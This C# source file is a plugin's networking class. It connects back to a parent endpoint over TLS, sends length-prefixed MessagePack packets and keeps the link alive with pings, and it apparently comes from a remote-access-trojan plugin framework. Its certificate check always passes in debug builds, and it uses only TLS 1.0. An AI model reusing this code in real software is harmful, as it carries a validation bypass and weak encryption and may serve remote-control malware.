using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

namespace Plugin
{
    public static class Connection
    {
        public static Socket TcpClient { get; set; }
        public static SslStream SslClient { get; set; }
        public static X509Certificate2 ServerCertificate { get; set; }
        public static bool IsConnected { get; set; }
        private static object SendSync { get; } = new object();
        public static string Hwid { get; set; }

        public static void InitializeClient(byte[] packet)
        {
            try
            {

                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };

                TcpClient.Connect(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[1]));
                if (TcpClient.Connected)
                {
                    Debug.WriteLine("Plugin Connected!");
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);

                    new Thread(() =>
                    {
                        Packet.Read();
                    }).Start();

                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                Debug.WriteLine("Disconnected!");
                IsConnected = false;
                return;
            }
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return ServerCertificate.Equals(certificate);
        }

        public static void Disconnected()
        {

            try
            {
                IsConnected = false;
                SslClient?.Dispose();
                TcpClient?.Dispose();
                GC.Collect();
            }
            catch { }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected || msg == null)
                    {
                        return;
                    }

                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (msg.Length > 1000000) //1mb
                    {
                        Debug.WriteLine("send chunks");
                        using (MemoryStream memoryStream = new MemoryStream(msg))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                TcpClient.Poll(-1, SelectMode.SelectWrite);
                                SslClient.Write(chunk, 0, read);
                                SslClient.Flush();

                            }
                        }
                    }
                    else
                    {
                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                        SslClient.Write(msg, 0, msg.Length);
                        SslClient.Flush();
                    }
                    Debug.WriteLine("Plugin Packet Sent");
                }
                catch
                {
                    IsConnected = false;
                    return;
                }
            }
        }

        public static void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Ping!)";
            Send(msgpack.Encode2Bytes());
            GC.Collect();
        }

    }
}
